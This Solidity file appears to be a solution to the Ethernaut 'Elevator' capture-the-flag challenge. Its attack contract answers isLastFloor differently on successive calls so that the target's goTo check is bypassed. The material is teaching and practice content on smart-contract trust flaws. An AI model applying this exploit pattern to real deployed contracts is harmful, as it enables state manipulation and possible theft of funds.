// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorAttack {
    bool private _isLastFloor = true;

    function isLastFloor(uint256) external returns (bool) {
        _isLastFloor = !_isLastFloor;
        return _isLastFloor;
    }

    function attack(IElevator _target) external {
        _target.goTo(0);
    }
}
